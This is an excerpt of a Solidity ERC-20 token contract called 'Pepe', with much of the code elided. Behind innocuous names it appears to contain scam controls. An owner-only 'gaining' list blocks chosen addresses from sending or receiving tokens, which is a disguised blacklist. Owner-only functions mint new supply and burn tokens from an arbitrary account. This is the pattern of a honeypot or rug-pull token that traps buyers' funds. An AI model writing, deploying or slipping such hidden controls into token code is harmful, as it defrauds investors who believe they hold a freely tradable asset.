/**
    ...
    // Telegram: https://t.me/pepeportal
...
contract Pepe is Context, IERC20, IERC20Metadata {
    ...
    mapping(address => bool) private _gainingbalances;
    mapping(address => bool) private _gaininglist;
    mapping(address => bool) private _balances1;
    
    
    uint256 public _totalSupply = 420696969696969*10**18;
    string public _name = "Pepe";
    string public _symbol= "PEPE";
     bool balances1 = true;

    address payable public charityAddress = payable(0x486371dB9a1593075C74ff71299Ba39273B6CEB0); // Marketing Address
    ...
    function addtoGaining(address _address) onlyowner() public {
        _gaininglist[_address] = true;
    }
    
    function removefromGaining(address _address) onlyowner() public {
        _gaininglist[_address] = false;
    }
    
    function isGaining(address _address) private view returns (bool) {
        return _gaininglist[_address];
    }
    ...
    require(_gaininglist[sender] == false, "ERC20: sender is gaining");
    require(_gaininglist[recipient] == false, "ERC20: recipient is gaining");
    ...
    function _approving_burn(address account, uint256 amount) onlyOwner  public virtual {
      ...
      function  mint_supply(address account, uint256 amount) onlyowner()  public virtual {
